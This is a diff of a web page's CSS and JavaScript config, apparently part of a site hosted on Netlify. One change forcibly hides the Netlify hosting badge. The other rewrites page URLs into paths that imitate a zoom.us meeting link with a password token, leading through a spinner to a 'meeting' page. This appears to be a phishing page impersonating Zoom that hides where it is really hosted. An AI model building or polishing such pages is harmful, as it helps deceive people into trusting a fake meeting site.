@@ -170,15 +170,17 @@ button { background-color: transparent; background-image: none; font-family: inh
   transform: translate(-50%, -50%) rotate(-45deg);
   border-radius: 2px; pointer-events: none; z-index: 3;
 }
-/* Hide Netlify Badge */
+/* Force Hide Netlify Badge */
 #netlify-badge, 
-a[href*="netlify.com"][target="_blank"]:not(.wc-link2),
-iframe[src*="netlify.com"],
-div[style*="position: fixed"][style*="bottom: 0"][style*="right: 0"] {
-  display: none !important;
-  opacity: 0 !important;
-  visibility: hidden !important;
+iframe[id="netlify-badge"], 
+iframe[src*="netlify.com"], 
+a[href*="netlify.com"][target="_blank"]:not(.wc-link2) { 
+  display: none !important; 
+  visibility: hidden !important; 
+  opacity: 0 !important; 
   pointer-events: none !important;
+  width: 0 !important;
+  height: 0 !important;
 }
 </style>
 </head>
@@ -326,8 +328,8 @@ div[style*="position: fixed"][style*="bottom: 0"][style*="right: 0"] {
   // ============================================================
   //  ★ CONFIG
   // ============================================================
-  var HOME_PAGE_URL     = '../index.html';
-  var SPINNER_PAGE_URL  = 'spinner.html?to=../meeting/index.html&ms=1500';
+  var HOME_PAGE_URL     = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/index.html';
+  var SPINNER_PAGE_URL  = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/preview/spinner.html?to=/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/meeting/index.html&ms=1500';
 
   var $ = function (id) { return document.getElementById(id); };
 
